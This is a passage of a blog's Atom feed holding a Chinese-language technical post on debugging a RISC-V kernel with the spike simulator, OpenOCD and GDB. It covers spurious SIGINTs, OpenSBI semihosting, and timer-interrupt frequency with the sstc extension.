<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TonyCrane&#39;s Blog</title>
  
  <subtitle>鹤翔万里的博客</subtitle>
  <link href="https://blog.tonycrane.cc/atom.xml" rel="self"/>
  
  <link href="https://blog.tonycrane.cc/"/>
  <updated>2024-09-19T08:12:22.620Z</updated>
  <id>https://blog.tonycrane.cc/</id>
  
  <author>
    <name>TonyCrane</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>「RISC-V」spike 工具链的调试与时钟中断学习</title>
    <link href="https://blog.tonycrane.cc/p/9188d8c1.html"/>
    <id>https://blog.tonycrane.cc/p/9188d8c1.html</id>
    <published>2024-09-19T05:27:51.000Z</published>
    <updated>2024-09-19T08:12:22.620Z</updated>
    
    <content type="html"><![CDATA[<p>想探索一下在 OS 课上写一个指导来让同学们可以像系统一样选择 <a href="https://github.com/riscv-software-src/riscv-isa-sim/">spike</a> 来进行 RISC-V kernel 调试。当时系统三助教的时候用过，但是 spike 是学长改过的 <a href="https://github.com/sycuricon/riscv-isa-cosim">riscv-isa-cosim</a>（加了 CJ 也就是 difftest 的部分），这个目前已经有段时间没更新了，所以在尝试使用最新版本 OpenSBI（启用 PIE 编译）的时候无法加载 ELF（还不支持 PIE），于是就更换成了最新的 spike，然后就有了以下的调试过程。</p><span id="more"></span><h2 id="关于工具链"><a href="#关于工具链" class="headerlink" title="关于工具链"></a>关于工具链</h2><p>Spike 这套东西的逻辑就是，spike 自身是一个专注于 RISC-V 规范的模拟器，而且也模拟了硬件机制，在调试时需要通过 JTAG 来调试，并且开了一个 remote bitbang 的端口用来收发指令。然后使用 <a href="https://github.com/openocd-org/openocd/">OpenOCD</a> 来连接这个 rbb 端口进行指令的解析，再开一个端口来供 GDB 读取这些信息进行调试。</p><p>Spike 是从 repo 中安装的最新版：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/riscv-software-src/riscv-isa-sim</span><br><span class="line"><span class="built_in">cd</span> riscv-isa-sim</span><br><span class="line">sudo apt install device-tree-compiler libboost-regex-dev libboost-system-dev</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure</span><br><span class="line">make -j$(nproc)</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>OpenOCD 是直接 apt 安装的，OpenSBI 也是 repo 中的最新版：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/riscv-software-src/opensbi</span><br><span class="line"><span class="built_in">cd</span> opensbi</span><br><span class="line">mkdir build</span><br><span class="line">make O=build CROSS_COMPILE=riscv64-linux-gnu- PLATFORM=generic</span><br><span class="line"><span class="comment"># output: build/platform/generic/firmware/fw_jump.elf</span></span><br></pre></td></tr></table></figure><p>然后一些命令：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">spike_run: all</span></span><br><span class="line">@echo Launch the spike ......</span><br><span class="line">@spike --kernel=arch/riscv/boot/Image <span class="variable">$(SPIKE_CONFIG)</span>/fw_jump.elf</span><br><span class="line"></span><br><span class="line"><span class="section">spike_debug: all</span></span><br><span class="line">@echo Launch the spike for debug ......</span><br><span class="line">@spike -H --rbb-port=9824 --kernel=arch/riscv/boot/Image <span class="variable">$(SPIKE_CONFIG)</span>/fw_jump.elf</span><br><span class="line"></span><br><span class="line"><span class="section">spike_bridge:</span></span><br><span class="line">@echo Launch the OpenOCD ......</span><br><span class="line">@openocd -f <span class="variable">$(SPIKE_CONFIG)</span>/spike.cfg</span><br></pre></td></tr></table></figure><p>其中 OpenOCD 的配置文件 <code>spike.cfg</code> 如下（最开始的版本）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">adapter driver remote_bitbang</span><br><span class="line">remote_bitbang_host localhost</span><br><span class="line">remote_bitbang_port 9824</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> _CHIPNAME riscv</span><br><span class="line">jtag newtap <span class="variable">$_CHIPNAME</span> cpu -irlen 5 </span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> _TARGETNAME <span class="variable">$_CHIPNAME</span>.cpu</span><br><span class="line">target create <span class="variable">$_TARGETNAME</span> riscv -chain-position <span class="variable">$_TARGETNAME</span></span><br><span class="line"></span><br><span class="line">bindto 0.0.0.0</span><br><span class="line">gdb_report_data_abort <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line">init</span><br><span class="line">halt</span><br></pre></td></tr></table></figure><p><code>make spike_run</code> 就是直接运行 kernel，<code>make spike_debug</code> 开启调试模式，再另开一个终端跑 <code>make spike_bridge</code> 启动 OpenOCD 然后就可以用 GDB 连接了。</p><h2 id="GDB-调试时不断遇到-SIGINT"><a href="#GDB-调试时不断遇到-SIGINT" class="headerlink" title="GDB 调试时不断遇到 SIGINT"></a>GDB 调试时不断遇到 SIGINT</h2><p>刚开始的时候 spike_run 没问题，但是一旦调试起来，连接上后再 b _start，随后 c 的话就会在中间多次遇到 SIGINT 导致调试暂停，即使 <code>handle SIGINT nostop</code> 的话也会看到跑到 _start 之前一直在忽略 SIGINT 而且效率极低。</p><p>这个问题调的很痛苦，因为在同一 OpenOCD 和配置下，用同样 OpenSBI，使用最新 spike 和老的 cosim 的结果不一样（cosim 不会 SIGINT），所以问题就被锁定在 spike 身上了。</p><p>起初我认为是 spike 添加了 debug triggers 的问题，因为我是头一次在 OpenSBI 的输出中看到 sdtrig 指令集扩展，然后看到了 4 triggers，但是虽然有 <code>--trigger</code> 参数来指定数量，也不能使它小于 1。同时即使设定了 <code>--isa=RV64gc</code> 不带任何扩展，也会自动加上 sdtrig。当时几乎就认定是 trigger 的问题了，但是后来在 riscv/processor.cc 中发现了函数 <code>processor_t::take_trigger_action</code>，在这个开头把输出的 trigger 信息硬性要求输出到 stdout 中，发现并没有输出：</p><figure class="highlight cpp"><figcaption><span>(spike) riscv/processor.cc:543</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processor_t::take_trigger_action</span><span class="params">(triggers::<span class="keyword">action_t</span> action, <span class="keyword">reg_t</span> breakpoint_tval, <span class="keyword">reg_t</span> epc, <span class="keyword">bool</span> virt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">    std::stringstream s; <span class="comment">// first put everything in a string, later send it to output</span></span><br><span class="line">    s &lt;&lt; <span class="string">&quot;core &quot;</span> &lt;&lt; std::dec &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27; &#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">3</span>) &lt;&lt; id</span><br><span class="line">      &lt;&lt; <span class="string">&quot;: trigger action &quot;</span> &lt;&lt; (<span class="keyword">int</span>)action &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">debug_output_log</span>(&amp;s);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>而且同样我在 <code>processor_t::take_trap</code> 开头把输出也强制打开了，也只能发现在 0x80000000 之后（屏蔽了这前面的部分，因为 0x1000 前会有 debug rom 一直在运行一直在 trap）只出现过一个 store access fault 的 trap。所以那就能排除掉 trigger 的问题了。</p><p>接着我从源码安装了 OpenOCD（v0.12+）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openocd-org/openocd/</span><br><span class="line"><span class="built_in">cd</span> openocd</span><br><span class="line">sudo apt install libtool</span><br><span class="line">./bootstrap</span><br><span class="line">./configure --enable-remote-bitbang</span><br><span class="line">make</span><br><span class="line"><span class="comment"># output: src/openocd</span></span><br></pre></td></tr></table></figure><p>与本地的 v0.11 的相比，它运行时多了一些 error，而且恰巧在每次 SIGINT 的同时都能看到新增了一条 error：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Warn : Failed to read memory via program buffer.</span><br><span class="line">Error: Failed write (NOP) at 0x7; status=2</span><br><span class="line">Error: Failed write (NOP) at 0x6; status=2</span><br><span class="line">Warn : Failed to read memory via abstract access.</span><br><span class="line">Error: Target riscv.cpu: Failed to read memory (addr=0x0)</span><br><span class="line">Error:   progbuf=failed, sysbus=skipped (unsupported size), abstract=failed</span><br></pre></td></tr></table></figure><p>我又认为这是 OpenOCD+GDB 在调试时访问 0x0 处的非法内存导致的，经学长解答，0x0 开始的这部分是一个 debug module，在调试的时候是会用到的。在 riscv/sim.cc 的 <code>sim_t::sim_t</code> 函数中也看到了开头就有一句 <code>bus.add_device(DEBUG_START, &amp;debug_module);</code>，然后我又去翻了翻 debug module，它在一些指定的位置才放了内存，比如 0x800 开始放了 debug rom，0x374 这里放了 progbuf，而其他没放的地方访问的时候都会像这样出错。这部分逻辑在 riscv/debug_module.cc 的 <code>debug_module_t::load</code> 中：</p><figure class="highlight cpp"><figcaption><span>(spike) riscv/debug_module.cc:125</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">debug_module_t::load</span><span class="params">(<span class="keyword">reg_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">uint8_t</span>* bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  addr = DEBUG_START + addr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (addr &gt;= DEBUG_ROM_ENTRY &amp;&amp;</span><br><span class="line">      (addr + len) &lt;= (DEBUG_ROM_ENTRY + debug_rom_raw_len)) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(bytes, debug_rom_raw + addr - DEBUG_ROM_ENTRY, len);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="built_in">D</span>(<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;ERROR: invalid load from debug module: %zd bytes at 0x%016&quot;</span></span><br><span class="line">          PRIx64 <span class="string">&quot;\n&quot;</span>, len, addr));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学长说 cosim 里面屏蔽了 0x0 这个地址，然后在这个地址的位置放了一个随机数设备来防止读取出问题，但我还是想找到问题所在，所以继续调了。</p><p>将末尾的 D() 去掉，然后 return true 就能让所有 0x0 - 0x1000 的访存合法，再跑一次发现 OpenOCD 那里确实没有报错了，然后每次都会从 0x0 开始请求一串内存，这里都会报 ERROR。但即使 OpenOCD 没了报错，GDB 还是会像原先一样隔一阵遇到一个 SIGINT，所以那这个 SIGINT 也不是由于 OpenOCD 读 debug 信息错误导致的。</p><p>接下来就翻了翻 OpenOCD 的文档，发现了在 GDB 相关的 20.2 节给出了一个简单的 GDB 调试案例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ arm-none-eabi-gdb example.elf</span><br><span class="line">(gdb) target extended-remote localhost:3333</span><br><span class="line">Remote debugging using localhost:3333</span><br><span class="line">...</span><br><span class="line">(gdb) monitor reset halt</span><br><span class="line">...</span><br><span class="line">(gdb) load</span><br><span class="line">Loading section .vectors, size 0x100 lma 0x20000000</span><br><span class="line">Loading section .text, size 0x5a0 lma 0x20000100</span><br><span class="line">Loading section .data, size 0x18 lma 0x200006a0</span><br><span class="line">Start address 0x2000061c, load size 1720</span><br><span class="line">Transfer rate: 22 KB/sec, 573 bytes/write.</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里多了一句 <code>monitor reset halt</code> 不知道是干什么，然后随手一试，加上这一句之后 SIGINT 就消失了，可以正常调试了。或者在 spike.cfg 配置的最后把 <code>halt</code> 改成 <code>reset halt</code> 也可以，因为 GDB 的 <code>monitor</code> 就相当于发指令给 OpenOCD。又搜了一些也没找到这样做的理由，听到的说法都是刷新程序，让它好接收后面的断点和调试。所以调了好久最后原因是 OpenOCD 的配置问题，但为什么 cosim 的老 spike 没遇到问题还是没解决，但已经无所谓了感觉。</p><h2 id="Semihosting-相关"><a href="#Semihosting-相关" class="headerlink" title="Semihosting 相关"></a>Semihosting 相关</h2><p>接下来没有 SIGINT 就可以一直跑起来的，但是并没有断在 _start 的断点的位置，而是在 OpenSBI 中的 ebreak，这个 ebreak 是在 <code>_semihost_test_vector_next</code> 标号里的，这个是由 OpenSBI 的 lib/utils/serial/semihosting.c 的 semihosting_enabled 函数引入的。学长说是因为 spike 并没有支持 semihosting 机制，所以在之前使用的 OpenSBI 中手动在 semihosting_enabled 和 semihosting_trap 函数的开头直接 return 了 0 来 patch 掉。</p><p>搜了一下 semihosting 相关，这是一个由 arm 引入的调试方法。因为硬件上通过串口输出还要经过设备时序等一系列，会加重调试负担，所以 semihosting 机制通过将输出等一系列功能交给调试主机来做，这样就不需要硬件串口支持了。只需要在比如 print 输出的时候调用一下 SVC HLT BKPT 等可以让调试器接手的指令，然后调试器会安装协议读取要进行的操作等，由调试器来进行输出。</p><p>在 RISC-V 上，这样陷入调试器的指令是 ebreak，但是也只有 ebreak，无法区分普通 ebreak 和 semihosting 用的 ebreak。所以 RISC-V 规定，semihosting 的 ebreak 前后会跟两条特殊的 nop 指令，形成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">slli x0, x0, 0x1f</span><br><span class="line">ebreak</span><br><span class="line">srai x0, x0, 7</span><br></pre></td></tr></table></figure><p>调试器在遇到 ebreak 之后可以检查前后两条指令，如果是这样的形式，那么就是 semihosting 的 ebreak，否则就是普通的 ebreak。这个是在 RISC-V 的 <a href="https://github.com/riscv-non-isa/riscv-semihosting">riscv-non-isa/riscv-semihosting</a> 中规定的。</p><p>看了 spike 的源码，关于 ebreak 指令的处理确实没有检查前后两条指令的操作。但转念一想，spike 作为一个指令模拟器，它就是一个待调试的硬件设备，而真正处理 semihosting 的应该是调试器，而在这套工具链里调试器是 OpenOCD，所以实际的工作应该在 OpenOCD 层面，在收到 ebreak 之后额外检查两条指令。</p><p>经过搜索，OpenOCD 还真有这么一条指令 <code>arm semihosting enable</code>，也就是 GDB 里的 <code>monitor arm semihosting enable</code>。跑了这条指令之后 GDB 就不会再卡在 semihosting 的 ebreak 了，因为这部分已经被 OpenOCD 解析成了 semihosting 请求来特殊处理了，而且 OpenSBI 输出的 platform console device 也从 uart8250 变成了 semihosting。也因此，输出等操作就由 OpenOCD 来完成了，而非 spike 的串口。所以这时候的内核输出在运行着 <code>make spike_bridge</code> 的终端里，而且这套效率并比不上串口，所以效率很低，以至于效果上是逐个字进行输出。</p><p>所以为了调试效率，还是不启用 semihosting 为好，但也不用直接 patch 掉相关逻辑，OpenSBI 提供了 kconfig 来进行配置，可以直接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make PLATFORM=generic menuconfig</span><br></pre></td></tr></table></figure><p>然后将 Utils and Drivers Support &gt; Serial Device Support &gt; Semihosting support 关掉再 make 就好了。</p><h2 id="时钟中断相关"><a href="#时钟中断相关" class="headerlink" title="时钟中断相关"></a>时钟中断相关</h2><p>最后一个问题是 spike 运行的 kernel 的时钟中断周期和 busy loop 长度都要少一个 0 才能达到和 qemu 一样的效果，也就是实际上的时钟频率是 1_000_000 Hz，不过 spike 运行的 OpenSBI 输出的 platform timer device 还是都是一样的 aclint-mtimer @ 10000000Hz。</p><p>找了 OpenSBI 的源码，对于 generic platform，timer 的频率是从设备树中读取的。generic 使用了 fdt_timer_mtimer，其中的 cold init 调用了 OpenSBI 的 lib/utils/timer/fdt_timer_mtimer.c 的 <code>timer_mtimer_cold_init</code> 函数：</p><figure class="highlight c"><figcaption><span>(opensbi) lib/utils/timer/fdt_timer_mtimer.c:33</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">timer_mtimer_cold_init</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *fdt, <span class="keyword">int</span> nodeoff,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct fdt_match *match)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">rc = fdt_parse_timebase_frequency(fdt, &amp;mt-&gt;mtime_freq);</span><br><span class="line"><span class="keyword">if</span> (rc) &#123;</span><br><span class="line">sbi_free(mtn);</span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>fdt_parse_timebase_frequency</code> 就是在读取设备树中的 <code>timebase-frequency</code> 属性，而这个属性在 spike 导出时就是 10_000_000：</p><figure class="highlight cpp"><figcaption><span>(spike) riscv/sim.cc:145</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dts = <span class="built_in">make_dts</span>(INSNS_PER_RTC_TICK, CPU_HZ, cfg, mems, device_nodes);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><figcaption><span>(spike) riscv/dts.cc:59</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;    timebase-frequency = &lt;&quot;</span> &lt;&lt; (cpu_hz/insns_per_rtc_tick) &lt;&lt; <span class="string">&quot;&gt;;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里 CPU_HZ 是 1_000_000_000，INSNS_PER_RTC_TICK 是 100，所以 freq 是 10_000_000 没错。</p><p>但为什么 spike 跑起来实际比这个要慢得多呢，按理说 10_000_000Hz 的时钟频率，设定 10_000_000 的时钟中断间隔那出现的就是 1s 一个，为什么会 10s 一个。原因在于 spike 对于 mtime 的处理：</p><figure class="highlight cpp"><figcaption><span>(spike) riscv/clint.cc:100</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clint_t::tick</span><span class="params">(<span class="keyword">reg_t</span> rtc_ticks)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (real_time) &#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">now</span>;</span></span><br><span class="line">   <span class="keyword">uint64_t</span> diff_usecs;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">gettimeofday</span>(&amp;now, <span class="literal">NULL</span>);</span><br><span class="line">   diff_usecs = ((now.tv_sec - real_time_ref_secs) * <span class="number">1000000</span>) + (now.tv_usec - real_time_ref_usecs);</span><br><span class="line">   mtime = diff_usecs * freq_hz / <span class="number">1000000</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mtime += rtc_ticks;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; [hart_id, hart] : sim-&gt;<span class="built_in">get_harts</span>()) &#123;</span><br><span class="line">    hart-&gt;state.time-&gt;<span class="built_in">sync</span>(mtime);</span><br><span class="line">    hart-&gt;state.mip-&gt;<span class="built_in">backdoor_write_with_mask</span>(MIP_MTIP, mtime &gt;= mtimecmp[hart_id] ? MIP_MTIP : <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clint 是 Core Local Interruptor，局部中断器，负责产生软件中断和时钟中断。这里也看得出，在 <code>mtime &gt;= mtimecmp[hard_id]</code> 的时候设置 mip 的 mtip 位，即告诉 core 又一个时钟中断在等待处理。</p><p>而 mtime 更新的逻辑在前面，如果有 real_time 的情况下，mtime 按照实际时间更新，假设我们经过了 1s 的时间，那 diff_usecs 就是 1_000_000，所以 mtime = freq_hz，也就是 10_000_000，这样 1s 之后 mtime 就多了 10_000_000，如果 mtimecmp 设置的间隔也是这个，那就是 1s 一个中断。实际跑起来，如果加上 <code>--real-time-clint</code> 的话，时钟中断确实就 1s 出现一个了（间隔 10_000_000）。</p><p>那如果不加 real_time 呢，也就是说为什么之前会出现 10s 一个中断的情况。我们再次假设 mtimecmp 的间隔是 10_000_000，看一下多久会触发，也就是 mtime 什么时候能多加 10_000_000 个 rtc_ticks。因为 INSN_PER_RTC_TICK 是 100，所以跑 100 条指令多一个 rtc_tick，那触发一次时钟中断就要跑 1_000_000_000 条指令，也就是说只和跑了多少条指令有关，和实际时间无关，所以体感 10s 一个中断实际上是纯粹的 spike 跑的慢。</p><p>所以为了 qemu 和 spike 一样的表现，只需要在 spike 运行的时候加上 <code>--real-time-clint</code> 就好了，以及如果有 busy loop 输出的话还需要按 10 倍的规模调整一下循环次数。</p><h3 id="关于-memory-mapping-与-stimecmp"><a href="#关于-memory-mapping-与-stimecmp" class="headerlink" title="关于 memory-mapping 与 stimecmp"></a>关于 memory-mapping 与 stimecmp</h3><p>调试的时候有的时候想要找 mtime 和 mtimecmp 的值到底是多少，但是 GDB 并不能读取这两个寄存器，因为他们两个都是 memory mapping 的，也就是说他们的实际位置在内存上而非寄存器中。所以我们可以通过读取内存来获取这两个值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p/x &#123;unsigned long long&#125;0x2004000 # mtimecmp</span><br><span class="line">p/x &#123;unsigned long long&#125;0x200bff8 # mtime</span><br></pre></td></tr></table></figure><p>Spike 和 qemu 都是同样的地址（spike 相关代码同样可以在 riscv/clint.cc 中找到，也就是 load 和 store 两个函数）。</p><p>但是有些情况下即使设置了 mtimecmp 也不会发现 0x2004000 地址上有变化（比如较新的 qemu 跑最新的 OpenSBI）。我们可以通过 sbi 来调查这个问题，时钟中断的设置是通过调用 sbi_set_timer 完成的，通过翻 OpenSBI 源码可以找到这个 set_timer 的实际处理函数在 lib/sbi/sbi_timer.c 里：</p><figure class="highlight c"><figcaption><span>(opensbi) lib/sbi/sbi_timer.c:132</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbi_timer_event_start</span><span class="params">(u64 next_event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sbi_pmu_ctr_incr_fw(SBI_PMU_FW_SET_TIMER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Update the stimecmp directly if available. This allows</span></span><br><span class="line"><span class="comment"> * the older software to leverage sstc extension on newer hardware.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (sbi_hart_has_extension(sbi_scratch_thishart_ptr(), SBI_HART_EXT_SSTC)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __riscv_xlen == 32</span></span><br><span class="line">csr_write(CSR_STIMECMP, next_event &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">csr_write(CSR_STIMECMPH, next_event &gt;&gt; <span class="number">32</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">csr_write(CSR_STIMECMP, next_event);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (timer_dev &amp;&amp; timer_dev-&gt;timer_event_start) &#123;</span><br><span class="line">timer_dev-&gt;timer_event_start(next_event);</span><br><span class="line">csr_clear(CSR_MIP, MIP_STIP);</span><br><span class="line">&#125;</span><br><span class="line">csr_set(CSR_MIE, MIP_MTIP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里有一个 if 逻辑，如果 sbi hart 有 sstc 扩展，则写入 stimecmp csr 寄存器结束，否则调用 timer_dev 的 timer_event_start，而 qemu 和 spike 都在使用的 aclint_mtimer 设备的 timer_event_start 就是在读取 mtimecmp 的地址，所以这部分逻辑是设置 0x2004000 的值的。那么如果 0x2004000 一直是 -1 的话，就说明已经走了 sstc 扩展的 stimecmp 寄存器了。</p><p>Sstc 扩展是为了解决每次设置时钟中断都需要进入 sbi 陷入 M 模式设置 mtimecmp 的值导致效率下降的，这个扩展引入了 stimecmp csr 寄存器，同时规定只要 mtime &gt;= stimecmp 直接触发 S 模式时钟中断。这样就避免了从 memory mapping 设置 mtimecmp 再触发 M 态时钟中断后再通过 mideleg 转发到 S 模式的过程，提高了效率。是否启用了 sstc 可以看 OpenSBI 输出的 boot hart isa extensions，如果里面有 sstc 就说明启用了。</p><p>而 spike 默认是不开启 sstc 的，但是它也支持，在上面 clint.cc 的 114 行可以看到一个 <code>hart-&gt;state.time-&gt;sync(mtime)</code>，这个函数的内容如下：</p><figure class="highlight cpp"><figcaption><span>(spike) riscv/csrs.cc:1140</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">time_counter_csr_t::sync</span><span class="params">(<span class="keyword">const</span> <span class="keyword">reg_t</span> val)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">  shadow_val = val;</span><br><span class="line">  <span class="keyword">if</span> (proc-&gt;<span class="built_in">extension_enabled</span>(EXT_SSTC)) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">reg_t</span> mip_val = (shadow_val &gt;= state-&gt;stimecmp-&gt;<span class="built_in">read</span>() ? MIP_STIP : <span class="number">0</span>) |</span><br><span class="line">      (shadow_val + state-&gt;htimedelta-&gt;<span class="built_in">read</span>() &gt;= state-&gt;vstimecmp-&gt;<span class="built_in">read</span>() ? MIP_VSTIP : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">reg_t</span> mask = ((state-&gt;menvcfg-&gt;<span class="built_in">read</span>() &amp; MENVCFG_STCE) ? MIP_STIP : <span class="number">0</span>) | ((state-&gt;henvcfg-&gt;<span class="built_in">read</span>() &amp; HENVCFG_STCE) ? MIP_VSTIP : 